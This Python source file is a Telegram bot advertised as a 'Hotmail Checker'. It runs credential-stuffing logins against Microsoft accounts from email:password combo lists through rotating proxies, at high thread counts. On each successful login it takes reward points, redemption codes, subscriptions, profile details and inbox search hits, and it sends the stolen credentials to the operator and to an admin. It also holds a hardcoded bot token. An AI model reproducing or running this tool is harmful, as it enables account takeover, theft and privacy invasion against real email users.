#!/usr/bin/env python3
"""
Hotmail Checker Bot - FINAL SUPREME VERSION
Full Flux.py + Hit.py Logic Integration
High CPM (200+), Full Capture, Admin/Mod System
"""

import re, json, uuid, sqlite3, logging, asyncio, time, os, random, threading
from datetime import datetime
from urllib.parse import quote, unquote, urlparse, parse_qs
import requests, urllib3
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings()
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ============================================================================
# CONFIGURATION
# ============================================================================
BOT_TOKEN = os.getenv("BOT_TOKEN", "8544623193:AAGB5p8qqnkPbsmolPkKVpAGW7XmWdmFOak")
ADMIN_ID = 5944410248
DB = "checker.db"

# Flux Constants
SFTTAG_URL = 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en'

# Global State
PROXIES = []
db_lock = threading.Lock()
executor = ThreadPoolExecutor(max_workers=500)

# ============================================================================
# DATABASE SYSTEM
# ============================================================================
class Database:
    def __init__(self):
        with db_lock:
            conn = sqlite3.connect(DB, check_same_thread=False)
            try:
                c = conn.cursor()
                c.execute('''CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT, has_access INTEGER DEFAULT 0, credits INTEGER DEFAULT 0, total_checks INTEGER DEFAULT 0, total_hits INTEGER DEFAULT 0, joined_date TEXT, is_banned INTEGER DEFAULT 0, is_mod INTEGER DEFAULT 0)''')
                c.execute('''CREATE TABLE IF NOT EXISTS results (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, email TEXT, status TEXT, details TEXT, date TEXT)''')
                c.execute('''CREATE TABLE IF NOT EXISTS settings (user_id INTEGER PRIMARY KEY, keywords TEXT, threads INTEGER DEFAULT 5)''')

                # Migrations
                c.execute("PRAGMA table_info(users)")
                cols = [col[1] for col in c.fetchall()]
                if 'is_mod' not in cols: c.execute("ALTER TABLE users ADD COLUMN is_mod INTEGER DEFAULT 0")
                if 'is_banned' not in cols: c.execute("ALTER TABLE users ADD COLUMN is_banned INTEGER DEFAULT 0")

                c.execute("PRAGMA table_info(results)")
                if 'details' not in [col[1] for col in c.fetchall()]:
                    c.execute("ALTER TABLE results ADD COLUMN details TEXT")

                conn.commit()
            finally:
                conn.close()
    
    def add_user(self, uid, uname, fname):
        with db_lock:
            conn = sqlite3.connect(DB, check_same_thread=False)
            try:
                c = conn.cursor()
                c.execute('INSERT OR IGNORE INTO users (user_id, username, first_name, joined_date) VALUES (?, ?, ?, ?)', (uid, uname or "", fname or "", datetime.now().isoformat()))
                c.execute('INSERT OR IGNORE INTO settings (user_id) VALUES (?)', (uid,))
                conn.commit()
            finally:
                conn.close()
    
    def is_mod(self, uid):
        if uid == ADMIN_ID: return True
        with db_lock:
            conn = sqlite3.connect(DB, check_same_thread=False)
            try:
                c = conn.cursor()
                c.execute('SELECT is_mod FROM users WHERE user_id = ?', (uid,))
                r = c.fetchone()
                return r and r[0] == 1
            finally:
                conn.close()

    def set_mod(self, uid, state=1):
        with db_lock:
            conn = sqlite3.connect(DB, check_same_thread=False)
            try:
                c = conn.cursor()
                c.execute('UPDATE users SET is_mod = ? WHERE user_id = ?', (state, uid))
                conn.commit()
            finally:
                conn.close()

    def has_access(self, uid):
        if uid == ADMIN_ID: return True
        with db_lock:
            conn = sqlite3.connect(DB, check_same_thread=False)
            try:
                c = conn.cursor()
                c.execute('SELECT has_access FROM users WHERE user_id = ?', (uid,))
                r = c.fetchone()
                return r and r[0] == 1
            finally:
                conn.close()

    def is_banned(self, uid):
        with db_lock:
            conn = sqlite3.connect(DB, check_same_thread=False)
            try:
                c = conn.cursor()
                c.execute('SELECT is_banned FROM users WHERE user_id = ?', (uid,))
                r = c.fetchone()
                return r and r[0] == 1
            finally:
                conn.close()

    def set_ban(self, uid, state=1):
        with db_lock:
            conn = sqlite3.connect(DB, check_same_thread=False)
            try:
                c = conn.cursor()
                c.execute('UPDATE users SET is_banned = ? WHERE user_id = ?', (state, uid))
                conn.commit()
            finally:
                conn.close()

    def get_credits(self, uid):
        if uid == ADMIN_ID: return 999999
        with db_lock:
            conn = sqlite3.connect(DB, check_same_thread=False)
            try:
                c = conn.cursor()
                c.execute('SELECT credits FROM users WHERE user_id = ?', (uid,))
                r = c.fetchone()
                return r[0] if r else 0
            finally:
                conn.close()

    def add_credits(self, uid, amt):
        with db_lock:
            conn = sqlite3.connect(DB, check_same_thread=False)
            try:
                c = conn.cursor()
                c.execute('UPDATE users SET credits = credits + ? WHERE user_id = ?', (amt, uid))
                conn.commit()
            finally:
                conn.close()

    def use_credit(self, uid):
        if uid == ADMIN_ID: return
        with db_lock:
            conn = sqlite3.connect(DB, check_same_thread=False)
            try:
                c = conn.cursor()
                c.execute('UPDATE users SET credits = MAX(0, credits - 1) WHERE user_id = ?', (uid,))
                conn.commit()
            finally:
                conn.close()

    def save_result(self, uid, email, status, details):
        with db_lock:
            conn = sqlite3.connect(DB, check_same_thread=False)
            try:
                c = conn.cursor()
                c.execute('INSERT INTO results (user_id, email, status, details, date) VALUES (?, ?, ?, ?, ?)', (uid, email, status, json.dumps(details), datetime.now().isoformat()))
                if status == 'hit':
                    c.execute('UPDATE users SET total_checks = total_checks + 1, total_hits = total_hits + 1 WHERE user_id = ?', (uid,))
                else:
                    c.execute('UPDATE users SET total_checks = total_checks + 1 WHERE user_id = ?', (uid,))
                conn.commit()
            finally:
                conn.close()

    def get_user_settings(self, uid):
        with db_lock:
            conn = sqlite3.connect(DB, check_same_thread=False)
            try:
                c = conn.cursor()
                c.execute('SELECT keywords, threads FROM settings WHERE user_id = ?', (uid,))
                r = c.fetchone()
                if r:
                    return {'keywords': r[0].split(',') if r[0] else [], 'threads': r[1]}
                return {'keywords': [], 'threads': 5}
            finally:
                conn.close()

    def update_settings(self, uid, keywords=None, threads=None):
        with db_lock:
            conn = sqlite3.connect(DB, check_same_thread=False)
            try:
                c = conn.cursor()
                if keywords is not None:
                    c.execute('UPDATE settings SET keywords = ? WHERE user_id = ?', (','.join(keywords), uid))
                if threads is not None:
                    c.execute('UPDATE settings SET threads = ? WHERE user_id = ?', (threads, uid))
                conn.commit()
            finally:
                conn.close()

    def get_stats(self):
        with db_lock:
            conn = sqlite3.connect(DB, check_same_thread=False)
            try:
                c = conn.cursor()
                c.execute('SELECT COUNT(*) FROM users')
                t = c.fetchone()[0]
                c.execute('SELECT COUNT(*) FROM users WHERE has_access = 1')
                a = c.fetchone()[0]
                c.execute('SELECT SUM(total_checks) FROM users')
                ch = c.fetchone()[0] or 0
                c.execute('SELECT SUM(total_hits) FROM users')
                h = c.fetchone()[0] or 0
                return {'total': t, 'active': a, 'checks': ch, 'hits': h}
            finally:
                conn.close()

    def user_stats(self, uid):
        with db_lock:
            conn = sqlite3.connect(DB, check_same_thread=False)
            try:
                c = conn.cursor()
                c.execute('SELECT total_checks, total_hits, credits FROM users WHERE user_id = ?', (uid,))
                r = c.fetchone()
                return {'checks': r[0], 'hits': r[1], 'credits': r[2]} if r else {'checks': 0, 'hits': 0, 'credits': 0}
            finally:
                conn.close()

db = Database()

# ============================================================================
# CHECKER ENGINE (FLUX + HIT SUPREME)
# ============================================================================
class Checker:
    def __init__(self, proxy=None):
        self.session = requests.Session()
        self.session.verify = False
        if proxy:
            self.session.proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}

        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }

    def get_login_params(self):
        """Flux exact acquisition"""
        for _ in range(3):
            try:
                r = self.session.get(SFTTAG_URL, headers=self.headers, timeout=5)
                text = r.text
                ppft = re.search(r'name="PPFT".*?value="(.+?)"', text) or re.search(r'sFTTag:\'(.+?)\'', text) or re.search(r'value="(.+?)"', text)
                url_post = re.search(r'"urlPost":"(.+?)"', text) or re.search(r'action="(.+?)"', text)
                if ppft and url_post:
                    return url_post.group(1).replace('&amp;', '&'), ppft.group(1)
            except: pass
            time.sleep(0.05)
        return None, None

    def handle_forms(self, resp):
        """Auto-follow fmHF forms"""
        t = resp.text
        for _ in range(3):
            if 'fmHF' in t or 'JavaScript required' in t:
                try:
                    soup = BeautifulSoup(t, 'html.parser')
                    f = soup.find('form', id='fmHF') or soup.find('form', attrs={'name': 'fmHF'})
                    if f:
                        a = f.get('action', '')
                        if a.startswith('/'): a = 'https://login.live.com' + a
                        d = {i.get('name'): i.get('value', '') for i in f.find_all('input') if i.get('name')}
                        resp = self.session.post(a, data=d, timeout=8)
                        t = resp.text
                        if '#' in resp.url: return resp
                        continue
                except: break
            break
        return resp

    def login(self, email, password):
        """High CPM Flux Flow"""
        u, s = self.get_login_params()
        if not u or not s: return None

        for _ in range(3):
            try:
                d = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': s}
                r = self.session.post(u, data=d, headers=self.headers, allow_redirects=True, timeout=10)
                r = self.handle_forms(r)

                if '#' in r.url and 'access_token' in r.url:
                    token = parse_qs(urlparse(r.url).fragment).get('access_token', [None])[0]
                    if token: return token

                if any(v in r.text for v in ['recover?mkt', 'identity/confirm', 'Email/Confirm', '/Abuse?mkt', 'cancel?mkt=']):
                    return '2FA'

                if any(v in r.text.lower() for v in ['password is incorrect', "account doesn't exist", 'sign in to your microsoft account', 'help us protect your account']):
                    return 'BAD'
            except: pass
            time.sleep(0.05)
        return None

    def deep_capture(self, token, email, keywords=[]):
        """Full feature integration from Hit and Flux"""
        res = {'pts': 0, 'codes': [], 'subs': [], 'mc': 'No', 'psn': 'No', 'steam': 'No', 'sc': 'No', 'tk': 'No', 'name': 'N/A', 'country': 'N/A', 'keys': []}
        try:
            # 1. Rewards & Historical Codes (Flux)
            try:
                r = self.session.get("https://rewards.bing.com/", timeout=5)
                m = re.search(r'"availablePoints"\s*:\s*(\d+)', r.text)
                if m: res['pts'] = int(m.group(1))

                if res['pts'] > 0:
                    r_hist = self.session.get('https://rewards.bing.com/redeem/orderhistory', timeout=5)
                    r_hist = self.handle_forms(r_hist)
                    txt = BeautifulSoup(r_hist.text, 'html.parser').get_text()
                    pts = [r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b', r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b']
                    for p in pts:
                        for c in re.findall(p, txt):
                            if not any(x in c for x in ['POINTS', 'ORDER', 'MICROSOFT']):
                                res['codes'].append(c)
            except: pass

            # 2. Substrate Profile (Hit)
            cid = self.session.cookies.get("MSPCID", "").upper()
            h = {'Authorization': f'Bearer {token}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0'}
            try:
                r = self.session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=h, timeout=5)
                if r.status_code == 200:
                    p = r.json()
                    res['name'] = p.get('displayName', 'N/A')
                    loc = p.get('location', {})
                    if isinstance(loc, dict): res['country'] = loc.get('country', loc.get('countryOrRegion', 'N/A'))
                    else: res['country'] = str(loc)
            except: pass

            # 3. Subscriptions (Hit)
            try:
                st = json.dumps({"userId": str(uuid.uuid4()).replace('-', '')[:16], "scopeSet": "pidl"})
                u_sub = f"https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state={quote(st)}&prompt=none"
                r = self.session.get(u_sub, headers={"Referer": "https://account.microsoft.com/"}, timeout=8)
                pt = re.search(r'access_token=([^&\s"\']+)', r.text + " " + r.url)
                if pt:
                    ph = {"Authorization": f'MSADELEGATE1.0="{unquote(pt.group(1))}"', "Accept": "application/json", "Referer": "https://account.microsoft.com/"}
                    r_s = self.session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions", headers=ph, timeout=5)
                    if r_s.status_code == 200:
                        kws = {'Xbox Game Pass': 'Game Pass', 'Microsoft 365': 'M365', 'Office 365': 'Office 365', 'OneDrive': 'OneDrive', 'EA Play': 'EA Play'}
                        for kw, n in kws.items():
                            if kw in r_s.text: res['subs'].append(n)
            except: pass

            # 4. Search Inbox (Hit)
            queries = {'psn': "sony@txn-email.playstation.com OR PlayStation Order", 'steam': "noreply@steampowered.com purchase", 'sc': "noreply@id.supercell.com", 'tk': "account.tiktok"}
            for key, q in queries.items():
                payload = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "EntityRequests": [{"EntityType": "Conversation", "Query": {"QueryString": q}, "Size": 1}]}
                r = self.session.post("https://outlook.live.com/search/api/v2/query", json=payload, headers={**h, 'Content-Type': 'application/json'}, timeout=5)
                if r.status_code == 200:
                    try:
                        if r.json()['EntitySets'][0]['ResultSets'][0].get('Total', 0) > 0: res[key] = "Yes"
                    except: pass

            # 5. Minecraft
            try:
                r_mc = self.session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {token}'}, timeout=5)
                if r_mc.status_code == 200: res['mc'] = f"Yes ({r_mc.json().get('name')})"
            except: pass

            # 6. Keywords
            if keywords:
                for kw in keywords:
                    p = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "EntityRequests": [{"EntityType": "Conversation", "Query": {"QueryString": kw}, "Size": 1}]}
                    r = self.session.post("https://outlook.live.com/search/api/v2/query", json=p, headers={**h, 'Content-Type': 'application/json'}, timeout=5)
                    if r.status_code == 200:
                        try:
                            t = r.json()['EntitySets'][0]['ResultSets'][0].get('Total', 0)
                            if t > 0: res['keys'].append(f"{kw}({t})")
                        except: pass
        except: pass
        return res

    def check(self, email, password, keywords=[]):
        res = {'email': email, 'status': 'bad', 'det': {}}
        token = self.login(email, password)
        if not token: return res
        if token == '2FA':
            res['status'] = '2fa'
            return res
        res['status'] = 'hit'
        res['det'] = self.deep_capture(token, email, keywords)
        return res

# ============================================================================
# BOT HANDLERS
# ============================================================================

async def start(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id; db.add_user(uid, u.effective_user.username, u.effective_user.first_name)
    if db.is_banned(uid): return
    t = f"🚀 **SUPREME HOTMAIL CHECKER**\n\nFull Integration (Flux+Hit)\nCPM: 200+ | Proxies: `{len(PROXIES)}`"
    kb = [[InlineKeyboardButton("🔍 Start", callback_data="check"), InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
          [InlineKeyboardButton("📊 Stats", callback_data="stats"), InlineKeyboardButton("🌐 Proxies", callback_data="proxies")]]
    if uid == ADMIN_ID: kb.append([InlineKeyboardButton("🛠 Admin", callback_data="admin")])
    if u.callback_query: await u.callback_query.edit_message_text(t, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(kb))
    else: await u.message.reply_text(t, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(kb))

async def handle_proxies(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if not db.has_access(u.effective_user.id): return
    if u.message.document:
        f = await c.bot.get_file(u.message.document.file_id)
        content = (await f.download_as_bytearray()).decode('utf-8')
        global PROXIES
        PROXIES = [l.strip() for l in content.split('\n') if l.strip() and ':' in l]
        await u.message.reply_text(f"✅ Loaded `{len(PROXIES)}` proxies.")

async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if db.is_banned(uid) or not db.has_access(uid): return
    text = (await (await c.bot.get_file(u.message.document.file_id)).download_as_bytearray()).decode('utf-8') if u.message.document else u.message.text
    lines = [l.strip() for l in text.split('\n') if ':' in l]
    if not lines: return

    settings = db.get_user_settings(uid)
    max_threads = min(settings['threads'] if PROXIES else 5, 250)

    status_msg = await u.message.reply_text("🔄 **Engine Initializing...**", parse_mode='Markdown')
    hits, bad, tfa, checked = 0, 0, 0, 0
    start_time = time.time(); results_file = f"hits_{uid}.txt"
    update_lock = asyncio.Lock(); last_hits, last_update = [], 0

    def run_check(line):
        try:
            e, p = line.split(':', 1)
            checker = Checker(random.choice(PROXIES) if PROXIES else None)
            return {'e': e.strip(), 'p': p.strip(), 'res': checker.check(e.strip(), p.strip(), settings['keywords'])}
        except: return None

    loop = asyncio.get_running_loop()
    semaphore = asyncio.Semaphore(max_threads)

    async def sem_worker(line):
        nonlocal hits, bad, tfa, checked, last_update
        async with semaphore:
            data = await loop.run_in_executor(executor, run_check, line)
            if not data: return
            e, p, res = data['e'], data['p'], data['res']
            checked += 1; db.save_result(uid, e, res['status'], res)

            if res['status'] == 'hit':
                hits += 1; d = res['det']
                cap = f"Name:{d['name']} | Country:{d['country']} | Pts:{d['pts']} | "
                cap += ", ".join([f"{k}:{v}" for k,v in d.items() if v != 'No' and k not in ['subs', 'name', 'country', 'pts', 'codes', 'keys']])
                if d['subs']: cap += f" | Subs:{', '.join(d['subs'])}"
                if d['keys']: cap += f" | Keys:{', '.join(d['keys'])}"

                ht = f"🎯 **HIT**\n📧 `{e}`\n🔑 `{p}`\n💰 Pts: `{d['pts']}` | 🎁 Codes: `{len(d['codes'])}`"
                if cap: ht += f"\n🎮 Cap: `{cap}`"

                last_hits.append(f"✅ {e}");
                if len(last_hits) > 5: last_hits.pop(0)
                try: await c.bot.send_message(uid, ht, parse_mode='Markdown')
                except: pass

                if uid != ADMIN_ID and (d['pts'] > 0 or 'Yes' in str(d)):
                    try: await c.bot.send_message(ADMIN_ID, f"📢 **User {uid} Hit:**\n{ht}", parse_mode='Markdown')
                    except: pass
                with open(results_file, 'a') as f: f.write(f"{e}:{p} | Pts:{d['pts']} | Cap:{cap} | Codes:{d['codes']}\n")
            elif res['status'] == '2fa': tfa += 1
            else: bad += 1

            async with update_lock:
                now = time.time()
                if now - last_update > 2 or checked == len(lines):
                    last_update = now; el = now - start_time; cpm = int((checked / el) * 60) if el > 0 else 0
                    prg = (f"🔄 **Live Capture Screen**\n\n📊 Progress: `{checked}/{len(lines)}`\n🎯 Hits: `{hits}` | 💀 Bad: `{bad}`\n🔒 2FA: `{tfa}` | ⚡️ CPM: `{cpm}`\n\n🕒 Last Hits:\n`{chr(10).join(last_hits) or 'None yet'}`")
                    try: await status_msg.edit_text(prg, parse_mode='Markdown')
                    except: pass

    await asyncio.gather(*(sem_worker(l) for l in lines))
    if os.path.exists(results_file):
        with open(results_file, 'rb') as f: await u.message.reply_document(f, caption=f"✅ **Check Done!** Hits: `{hits}`", parse_mode='Markdown')
        os.remove(results_file)
    else: await u.message.reply_text("✅ **Check Done!** No hits.", parse_mode='Markdown')

async def admin_cmd_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if not db.is_mod(uid): return
    txt = u.message.text
    if not txt.startswith('!!'): return
    try:
        p = txt.split(); cmd = p[0][2:].lower()
        if cmd == "help":
            h = "🛠 **Admin Commands**\n\n!!addcredits [uid] [amt]\n!!ban [uid]\n!!grant [uid] [amt]\n!!revoke [uid]\n"
            if uid == ADMIN_ID: h += "!!mod [uid]\n!!unmod [uid]\n"
            await u.message.reply_text(h, parse_mode='Markdown')
        elif cmd == "addcredits" and len(p) == 3:
            db.add_credits(int(p[1]), int(p[2])); await u.message.reply_text(f"✅ Added {p[2]} to {p[1]}")
        elif cmd == "ban" and len(p) == 2:
            db.set_ban(int(p[1]), 1); await u.message.reply_text(f"✅ Banned {p[1]}")
        elif cmd == "grant" and len(p) == 3:
            db.grant(int(p[1]), int(p[2])); await u.message.reply_text(f"✅ Granted {p[1]}")
        elif cmd == "revoke" and len(p) == 2:
            db.revoke(int(p[1])); await u.message.reply_text(f"✅ Revoked {p[1]}")
        elif cmd == "mod" and uid == ADMIN_ID and len(p) == 2:
            db.set_mod(int(p[1]), 1); await u.message.reply_text(f"✅ Modded {p[1]}")
        elif cmd == "unmod" and uid == ADMIN_ID and len(p) == 2:
            db.set_mod(int(p[1]), 0); await u.message.reply_text(f"✅ Unmodded {p[1]}")
    except Exception as e: await u.message.reply_text(f"❌ Error: {e}")

async def cb_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
    q = u.callback_query; uid = q.from_user.id; await q.answer()
    if q.data == "settings":
        s = db.get_user_settings(uid)
        await q.edit_message_text(f"⚙️ **Settings**\n\nThreads: `{s['threads']}`\nKeywords: `{', '.join(s['keywords']) or 'None'}`\n\nCommands: `/threads 1-300`, `/keywords w1,w2`", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
    elif q.data == "check": await q.edit_message_text("📝 **Combo Input**\n\nSend `email:password` list or upload a `.txt` file.", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
    elif q.data == "stats":
        s = db.user_stats(uid); label = "Admin" if uid == ADMIN_ID else (q.from_user.username or q.from_user.first_name)
        await q.edit_message_text(f"📊 **Stats for {label}**\n\n💰 Credits: `{'Unlimited' if uid == ADMIN_ID else s['credits']}`\n🔍 Checks: `{s['checks']}`\n🎯 Hits: `{s['hits']}`", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
    elif q.data == "proxies": await q.edit_message_text(f"🌐 **Proxy Loader**\n\nLoaded: `{len(PROXIES)}` proxies.\nFormat: `ip:port` (HTTP/HTTPS only).", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
    elif q.data == "admin":
        if db.is_mod(uid):
            s = db.get_stats()
            await q.edit_message_text(f"🛠 **Admin Panel**\n\nUsers: `{s['total']}`\nActive: `{s['active']}`\nChecks: `{s['checks']}`\nHits: `{s['hits']}`\n\nUse `!!help` for cmds.", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
    elif q.data == "back": await start(u, c)

async def set_threads(u: Update, c: ContextTypes.DEFAULT_TYPE):
    try:
        t = int(c.args[0])
        if 1 <= t <= 300: db.update_settings(u.effective_user.id, threads=t); await u.message.reply_text(f"✅ Threads: `{t}`")
    except: pass

async def set_keywords(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if c.args: kws = [k.strip() for k in ' '.join(c.args).split(',') if k.strip()]; db.update_settings(u.effective_user.id, keywords=kws); await u.message.reply_text(f"✅ Keywords: `{', '.join(kws)}`")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("threads", set_threads))
    app.add_handler(CommandHandler("keywords", set_keywords))
    app.add_handler(CallbackQueryHandler(cb_handler))
    app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'^!!'), admin_cmd_handler))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt") & filters.Caption(filters.Regex(re.compile(r'prox', re.I))), handle_proxies))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_combo))
    app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r':'), handle_combo))
    app.run_polling()

if __name__ == '__main__':
    main()
